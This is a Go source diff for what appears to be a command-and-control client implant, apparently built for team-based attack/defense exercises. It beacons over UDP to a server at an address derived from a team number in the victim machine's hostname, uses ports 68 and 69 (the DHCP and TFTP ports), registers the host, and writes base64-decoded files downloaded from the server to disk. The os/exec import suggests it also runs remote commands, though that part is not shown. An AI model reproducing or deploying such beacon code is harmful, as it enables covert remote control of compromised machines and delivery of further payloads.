@@ -9,14 +9,15 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"regexp"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
 )
 
 const (
-	brokerIP   = "127.0.0.1" // change to server IP if remote
-	serverPort = 68
+	serverPort = 69
 	pollEvery  = 10 * time.Second
 	readTO     = 3 * time.Second // how long to wait for server reply
 )
@@ -72,8 +73,27 @@ func downloadFile(path, b64 string) error {
 	return os.WriteFile(path, data, 0644)
 }
 
+func getTeamNumber(s string) (int, error) {
+	// Regular expression to match numbers 1-20
+	re := regexp.MustCompile(`\b(?:1?[0-9]|20)\b`)
+	match := re.FindString(s)
+	if match == "" {
+		return 0, fmt.Errorf("no number found")
+	}
+	return strconv.Atoi(match)
+}
+
 func main() {
 
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = "error fetching hostname"
+	}
+	teamNumber, err := getTeamNumber(hostname)
+	if err != nil {
+		teamNumber = 20
+	}
+	brokerIP := fmt.Sprintf("10.%d.1.4", teamNumber)
 	serverAddr := &net.UDPAddr{
 		IP:   net.ParseIP(brokerIP),
 		Port: serverPort,
@@ -87,10 +107,6 @@ func main() {
 	log.Printf("client: starting, will poll server %s every %v", serverAddr.String(), pollEvery)
 	log.Printf("registering...")
 
-	hostname, err := os.Hostname()
-	if err != nil {
-		hostname = "error fetching hostname"
-	}
 	clientID := hostname
 	ip, err := getMyIP()
 	if err != nil {
